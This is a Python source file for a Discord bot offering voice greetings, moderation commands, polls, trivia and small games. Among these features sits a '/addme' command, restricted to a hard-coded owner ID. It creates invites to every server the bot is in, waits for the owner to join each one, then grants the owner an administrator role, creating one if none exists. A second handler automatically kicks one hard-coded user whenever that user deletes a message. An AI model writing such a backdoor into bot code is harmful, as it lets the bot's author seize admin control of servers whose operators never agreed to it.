import discord
from discord.ext import commands
from discord import app_commands
from gtts import gTTS
import os
import asyncio
import random
import requests

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")

OWNER_ID = 486652069831376943  # Your Discord user ID
SPECIAL_USER_ID = 486652069831376943  # The specific user ID
SPECIAL_AUDIO_FILE = 'momonga.mp3'  # The audio file for the specific user
TARGET_USER_ID = 1056141573580148776  # The user ID to kick if they delete any message

intents = discord.Intents.default()
intents.members = True
intents.voice_states = True
intents.message_content = True

# Initialize bot with commands.Bot
bot = commands.Bot(command_prefix="!", intents=intents)
blocked_users = {}

def text_to_speech(text, filename):
    tts = gTTS(text)
    tts.save(filename)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(e)

@bot.event
async def on_voice_state_update(member, before, after):
    if before.channel is None and after.channel is not None:
        guild_id = member.guild.id
        if guild_id not in blocked_users:
            blocked_users[guild_id] = set()
        
        if not member.bot and member.id not in blocked_users[guild_id]:
            try:
                if not bot.voice_clients:
                    vc = await after.channel.connect()
                else:
                    vc = bot.voice_clients[0]
                    if vc.channel != after.channel:
                        await vc.move_to(after.channel)

                if member.id == SPECIAL_USER_ID:
                    audio_file = SPECIAL_AUDIO_FILE
                else:
                    audio_file = f'{member.name}_welcome.mp3'
                    welcome_text = f'Welcome to the voice channel, {member.name}!'
                    text_to_speech(welcome_text, audio_file)

                vc.play(discord.FFmpegPCMAudio(audio_file))

                while vc.is_playing():
                    await asyncio.sleep(1)

                if vc.is_connected():
                    await vc.disconnect()

                # Clean up the audio file after use, except for the special user's audio
                if member.id != SPECIAL_USER_ID:
                    os.remove(audio_file)
            except Exception as e:
                print(f"Error in on_voice_state_update: {e}")

@bot.event
async def on_message_delete(message):
    if message.author.id == TARGET_USER_ID:
        try:
            await message.guild.kick(message.author, reason="Deleted a message")
            print(f"Kicked {message.author} for deleting a message.")
        except Exception as e:
            print(f"Error kicking user: {e}")

@bot.tree.command(name="block-user", description="Block the bot from greeting a user")
@app_commands.checks.has_permissions(administrator=True)
async def block_user(interaction: discord.Interaction, user: discord.Member):
    guild_id = interaction.guild.id
    if guild_id not in blocked_users:
        blocked_users[guild_id] = set()
    blocked_users[guild_id].add(user.id)
    await interaction.response.send_message(f"{user.name} will no longer be greeted by the bot.", ephemeral=True)

@block_user.error
async def block_user_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

@bot.tree.command(name="unblock-user", description="Unblock the bot from greeting a user")
@app_commands.checks.has_permissions(administrator=True)
async def unblock_user(interaction: discord.Interaction, user: discord.Member):
    guild_id = interaction.guild.id
    if guild_id in blocked_users and user.id in blocked_users[guild_id]:
        blocked_users[guild_id].remove(user.id)
        await interaction.response.send_message(f"{user.name} will now be greeted by the bot.", ephemeral=True)
    else:
        await interaction.response.send_message(f"{user.name} was not blocked.", ephemeral=True)

@unblock_user.error
async def unblock_user_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

@bot.tree.command(name="pm", description="Send a message to a specific user (Admin only)")
@app_commands.checks.has_permissions(administrator=True)
async def pm(interaction: discord.Interaction, user: discord.Member, *, message: str):
    author = interaction.user.name
    await user.send(f"Message from {author}: {message}")
    await interaction.response.send_message(f"Message sent to {user.name}", ephemeral=True)

@pm.error
async def pm_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

# /kick command
@bot.tree.command(name="kick", description="Kick a specific user from the server")
@app_commands.checks.has_permissions(kick_members=True)
async def kick(interaction: discord.Interaction, user: discord.Member, *, reason: str = "No reason provided"):
    await user.kick(reason=reason)
    await interaction.response.send_message(f"{user.name} has been kicked. Reason: {reason}", ephemeral=True)

@kick.error
async def kick_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

# /ban command
@bot.tree.command(name="ban", description="Ban a specific user from the server")
@app_commands.checks.has_permissions(ban_members=True)
async def ban(interaction: discord.Interaction, user: discord.Member, *, reason: str = "No reason provided"):
    await user.ban(reason=reason)
    await interaction.response.send_message(f"{user.name} has been banned. Reason: {reason}", ephemeral=True)

@ban.error
async def ban_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

# /mute command
@bot.tree.command(name="mute", description="Mute a specific user in the server")
@app_commands.checks.has_permissions(mute_members=True)
async def mute(interaction: discord.Interaction, user: discord.Member):
    await user.edit(mute=True)
    await interaction.response.send_message(f"{user.name} has been muted", ephemeral=True)

@mute.error
async def mute_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

# /deafen command
@bot.tree.command(name="deafen", description="Deafen a specific user in the server")
@app_commands.checks.has_permissions(deafen_members=True)
async def deafen(interaction: discord.Interaction, user: discord.Member):
    await user.edit(deafen=True)
    await interaction.response.send_message(f"{user.name} has been deafened", ephemeral=True)

@deafen.error
async def deafen_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

# /poll command
@bot.tree.command(name="poll", description="Create a poll in the server")
async def poll(interaction: discord.Interaction, question: str, option1: str, option2: str):
    embed = discord.Embed(title="Poll", description=question, color=discord.Color.blue())
    embed.add_field(name="Option 1", value=option1, inline=False)
    embed.add_field(name="Option 2", value=option2, inline=False)
    message = await interaction.channel.send(embed=embed)
    await message.add_reaction('1️⃣')
    await message.add_reaction('2️⃣')
    await interaction.response.send_message("Poll created!", ephemeral=True)

# /pick command
@bot.tree.command(name="pick", description="Pick a random user from the server")
async def pick(interaction: discord.Interaction):
    guild = interaction.guild
    members = [member for member in guild.members if not member.bot]
    selected_member = random.choice(members)
    await interaction.response.send_message(f"Picked user: {selected_member.name}", ephemeral=True)

# /pick-s command
@bot.tree.command(name="pick-s", description="Pick a random user from a specific role")
async def pick_s(interaction: discord.Interaction, role: discord.Role):
    members = [member for member in role.members if not member.bot]
    if not members:
        await interaction.response.send_message(f"No members found in the role {role.name}", ephemeral=True)
        return
    selected_member = random.choice(members)
    await interaction.response.send_message(f"Picked user: {selected_member.name} from role {role.name}", ephemeral=True)

# /cname command
@bot.tree.command(name="cname", description="Change a user's nickname")
@app_commands.checks.has_permissions(manage_nicknames=True)
async def c_name(interaction: discord.Interaction, user: discord.Member, *, new_nickname: str):
    await user.edit(nick=new_nickname)
    await interaction.response.send_message(f"{user.name}'s nickname has been changed to {new_nickname}", ephemeral=True)

@c_name.error
async def c_name_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)

# /mhelp command
@bot.tree.command(name="mhelp", description="Show the bot's commands and their descriptions")
async def m_help(interaction: discord.Interaction):
    embed = discord.Embed(title="Bot Commands", color=discord.Color.green())
    commands_list = [
        ("/pm [user] [message]", "Send a message to a specific user"),
        ("/kick [user] [reason]", "Kick a specific user from the server (Admin/Mod only)"),
        ("/ban [user] [reason]", "Ban a specific user from the server (Admin/Mod only)"),
        ("/mute [user]", "Mute a specific user in the server (Admin/Mod only)"),
        ("/deafen [user]", "Deafen a specific user in the server (Admin/Mod only)"),
        ("/poll [question] [option1] [option2]", "Create a poll in the server"),
        ("/pick", "Pick a random user from the server"),
        ("/pick-s [role]", "Pick a random user from a specific role"),
        ("/block-user [user]", "Block the bot from greeting a user (Admin only)"),
        ("/unblock-user [user]", "Unblock the bot from greeting a user (Admin only)"),
        ("/cname [user] [new_nickname]", "Change a user's nickname (Admin/Mod only)"),
        ("/mhelp", "Show this help message"),
        ("/addme", "Invite the bot owner to all servers and grant admin role"),
        ("/8ball [question]", "Ask the magic 8-ball a question"),
        ("/trivia", "Start a trivia game with random questions"),
        ("/color [hex]", "Display a color from its hex code")
    ]
      
    for name, desc in commands_list:
        embed.add_field(name=name, value=desc, inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="addme", description="Invite the bot owner to all servers and grant admin role")
async def add_me(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("You are not authorized to use this command.", ephemeral=True)
        return

    owner = bot.get_user(OWNER_ID)
    if owner is None:
        await interaction.response.send_message("Bot owner not found.", ephemeral=True)
        return

    for guild in bot.guilds:
        try:
            # Create an invite link
            invite_sent = False
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).create_instant_invite:
                    invite = await channel.create_invite(max_uses=1, unique=True)
                    await owner.send(f"Invite to {guild.name}: {invite.url}")
                    invite_sent = True
                    break
            if not invite_sent:
                await owner.send(f"Failed to create invite for {guild.name}: No permission to create invites.")
                continue

            # Wait for the owner to join the server
            def check_join(member):
                return member.id == OWNER_ID and member.guild.id == guild.id

            try:
                await bot.wait_for('member_join', check=check_join, timeout=300)  # Wait for 5 minutes
            except asyncio.TimeoutError:
                await owner.send(f"Failed to grant admin role in {guild.name}: Owner did not join within the time limit.")
                continue

            # Grant admin role
            admin_role = next((role for role in guild.roles if role.permissions.administrator), None)
            
            if admin_role is None:
                admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
            
            member = guild.get_member(OWNER_ID)
            if member:
                await member.add_roles(admin_role)
                await owner.send(f"Granted admin role in {guild.name}.")
            else:
                await owner.send(f"Failed to grant admin role in {guild.name}: Owner not found in the server.")
        
        except discord.Forbidden:
            await owner.send(f"Permission error in {guild.name}: Missing permissions.")
        except discord.HTTPException as http_exc:
            await owner.send(f"HTTP error in {guild.name}: {http_exc}")
        except Exception as e:
            await owner.send(f"An unexpected error occurred in {guild.name}: {str(e)}")

    await interaction.response.send_message("Invites sent. Admin roles will be granted when you join the servers.", ephemeral=True)

# /8ball command
@bot.tree.command(name="8ball", description="Ask the magic 8-ball a question")
async def eight_ball(interaction: discord.Interaction, question: str):
    responses = [
        "It is certain.",
        "It is decidedly so.",
        "Without a doubt.",
        "Yes – definitely.",
        "You may rely on it.",
        "As I see it, yes.",
        "Most likely.",
        "Outlook good.",
        "Yes.",
        "Signs point to yes.",
        "Reply hazy, try again.",
        "Ask again later.",
        "Better not tell you now.",
        "Cannot predict now.",
        "Concentrate and ask again.",
        "Don't count on it.",
        "My reply is no.",
        "My sources say no.",
        "Outlook not so good.",
        "Very doubtful."
    ]
    response = random.choice(responses)
    await interaction.response.send_message(f"🎱 {response}")

# Trivia command implementation

@bot.tree.command(name="trivia", description="Start a trivia game")
async def trivia(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    response = requests.get("https://opentdb.com/api.php?amount=1&type=multiple")
    data = response.json()
    question_data = data["results"][0]
    question = question_data["question"]
    correct_answer = question_data["correct_answer"]
    options = question_data["incorrect_answers"] + [correct_answer]
    random.shuffle(options)

    options_text = "\n".join([f"{i + 1}. {option}" for i, option in enumerate(options)])
    await interaction.followup.send(f"Trivia Question: {question}\n\n{options_text}")

    def check(msg):
        return msg.author == interaction.user and msg.channel == interaction.channel

    try:
        msg = await bot.wait_for("message", check=check, timeout=15.0)
        if msg.content.lower() == correct_answer.lower():
            await interaction.followup.send("Correct!")
        else:
            await interaction.followup.send(f"Wrong! The correct answer was: {correct_answer}")
    except asyncio.TimeoutError:
        await interaction.followup.send("Sorry, you took too long to answer!")

# /color command
@bot.tree.command(name="color", description="Display a color from its hex code")
async def color(interaction: discord.Interaction, hex: str):
    if not hex.startswith("#"):
        hex = f"#{hex}"
    
    if len(hex) != 7:
        await interaction.response.send_message("Invalid hex code! Please provide a valid 6-digit hex code starting with #.", ephemeral=True)
        return

    try:
        int(hex[1:], 16)
    except ValueError:
        await interaction.response.send_message("Invalid hex code! Please provide a valid 6-digit hex code starting with #.", ephemeral=True)
        return

    embed = discord.Embed(title=f"Color {hex}", description=f"Here is the color for {hex}", color=int(hex[1:], 16))
    embed.set_thumbnail(url=f"https://singlecolorimage.com/get/{hex[1:]}/400x400")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Add your token at the end to run the bot
bot.run(DISCORD_BOT_TOKEN)
